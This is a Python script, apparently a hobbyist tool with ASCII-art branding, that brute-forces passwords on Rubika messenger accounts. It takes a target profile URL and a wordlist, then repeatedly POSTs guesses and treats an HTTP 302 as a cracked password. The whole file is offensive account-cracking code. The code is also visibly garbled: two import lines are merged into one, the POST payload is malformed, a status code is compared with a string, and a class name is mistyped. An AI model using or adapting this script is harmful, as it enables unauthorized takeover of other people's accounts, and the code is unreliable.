#py3                                                       # coded by mmd
from sys import flags                                      import requests,time
import os
import sys
import colorama, colored

class colorma:
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDER = '\033[4m'
    #--- ITS END ---
    END = '\033[0m'
print ()
ins = input ("install requests (y/n)-? ⟩⟩> ")

if ins == "y".lower():
    print ()
    os.system("pip install requests --upgrade")
    print ()

if ins == "n".lower():
    print ()

os.system("clear")
time.sleep(1)
print ()
name = input (f"{colorma.GREEN}please enter your name ⟩⟩ ")
print ("\n"*10)
time.sleep(1)
user = input(f"""{colorma.YELLOW}



                                                     .
      .n                     . MMD-RYSON  .                n.
  . .dP                   dP               9b               9b   .
 4  qXb         .        dX                 Xb       .      dXp   t
dX.  9Xb      .dXb     __                     __    dXb.   dXP   .Xb
9XXb._     _.dXXXXb dXXXXbo.               dXXXXb dXXXXb._   _.dXXP
 9XXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXP
   9XXXXXXXXXXXXXXX ~   ~ OOO8b   d8OOO ~   ~ XXXXXXXXXXXXXXXXXP
     9XXXXXP   9XX      *     98v8P      *     XXP   9XXXXXXXP
      ~~~       9X.          .db|db.          .XP       ~~~
                  )b.  .dbo.dP' v  9b.odb.  .dX(
                ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
               dXXXXXXXXXXXP'   .    9XXXXXXXXXXXb
              dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
              9XXb'    XXXXXb.dX|Xb.dXXXXX'    dXXP
                       9XXXXXX(   )XXXXXXP
                       XXXX X. v .X XXXX
                        XP^X' b   d' X^XX
                        X. 9         P )X
                         b          '  d'










 [https://web.rubika.ir/#c=uxxxxxxxx]

 [https://web.rubika.ir/#im?um=@xxxx]




{colorma.BLUE} ⟩⟩ [{name}] ⟩⟩ {colorma.GREEN}please enter username target- type user ⟩⟩ {colorma.END}""")
print ()
users = user.split(".")
try:
    if(users[1] == 'rubika'):
        try:
            stats = requests.get(f"{user}") #Edit Url For Input User
        except:
            print(f"{colorma.RED}[X] Error Net : Please Check Internet{colorma.END}")
            exit()

        if(stats.status_code == 404):
            print(f"{colorma.RED}[X] Error 404 : Not This Link Target For Database Rubika{colorma.END}")
        elif(stats.status_code == 200):
            print(f"{colorma.GREEN}[+] Alert : Find Link Target For Database Rubika True{colorma.END}")
            sd = input(f"{colorma.YELLOW}[?] password list [y/n] ⟩⟩ {colorma.END} ")
            if(sd == "y".lower()):
                worldlist = input(f"{colorma.YELLOW}[?] Please Enter Path Codes List :>{colorma.END} ")
            elif(sd == "n".lower()):
                worldlist = "cod.txt"
            else:
                print(f"{colorama.RED}[X] Error Index{colorma.END}")
                exit()
            try:
                shekan = True
                wordlist = open(worldlist,"r").read().split()
                print(f"\r{colorma.GREEN}[+] start > 5s",end="",flush=False)
                time.sleep(1)
                print(f"\r{colorma.GREEN}[+] start >> 4s",end="",flush=False)
                time.sleep(1)
                print(f"\r{colorma.GREEN}[+] start >>> 3s",end="",flush=False)
                time.sleep(1)
                print(f"\r{colorma.GREEN}[+] start >>>> 2s",end="",flush=False)
                time.sleep(1)
                print(f"\r{colorma.GREEN}[+] start >>>> 1s\r")
                time.sleep(1)

                usd = users[0].split("/")
                users = usd[2]

                while shekan:
                    for word in wordlist:
                        Target = requests.post(f"{user}",data=f"{word}{users}")
                        # _

                        try:
                            if(Target.status_code == 302):
                                print(f"{colorma.GREEN}[{time.ctime()}] {user}:{80} [played] : {colorma.END}{colorma.BLUE}{word}")
                                shekan = False
                                break
                            else:
                                print(f"{colorma.RED}[{time.ctime()}] {user}:{80} [yes spam] : {colorma.END}{colorma.BLUE}{word}")
                        except:
                            print(f"{colorma.RED}[X] Error Net : No Internet{colorma.END}")
                            shekan = False
            except:
                print(f"{colorma.RED}[X] Error File : Not Find Path WordList{colorma.END}")
        elif(stats.status_code == "503"):
            print(f"{colorma.RED}[X] Error Net : Please Check Internet{colorma.END}")
        else:
            print(type(stats.status_code))
    else:
        print(f"{colorma.RED}[X]Error Url : False Url Rubika Please Typed Username True{colorma.END}")
except:
    print(f"{colorma.RED}[X]Error Url : False Url Rubika Please Typed Username True{colorma.END}")



# ended
